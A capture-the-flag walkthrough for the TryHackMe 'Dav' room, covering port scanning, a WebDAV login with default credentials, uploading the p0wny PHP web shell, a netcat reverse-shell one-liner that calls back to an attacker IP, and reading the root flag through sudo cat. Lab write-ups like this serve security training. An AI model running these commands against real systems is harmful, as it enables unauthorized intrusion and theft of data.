# Dav

**Room Link:** [https://tryhackme.com/room/bsidesgtdav](https://tryhackme.com/room/bsidesgtdav)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

We were able to login with the following default credentials

```
Username: wampp
Password: xampp
```

<figure><img src="../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

I tried cracking the hash but it wasn't working

**Kali**

```
hashcat -m 1600 passwd.dav /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

Using the credentials found earlier I was able to access the site using cadaver and upload a shell.

**Kali**

```
git clone https://github.com/flozz/p0wny-shell.git
cp p0wny-shell/shell.php shell.php
```

**Kali**

<pre><code><strong>cadaver http://$VICTIM:80/webdav
</strong>Username: wampp
Password: xampp
dav:/webdav/> put shell.php shell.php
</code></pre>

<figure><img src="../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

**Kali**

<pre><code><strong>nc -lvnp 1337
</strong></code></pre>

**Victim**

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.100.133 1337 >/tmp/f
```

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

I first tried reading shadow to crack the users credentials but it wasn't working so I ended up just reading the flag.

**Victim**

```
LFILE=/root/root.txt
sudo cat "$LFILE"
```























































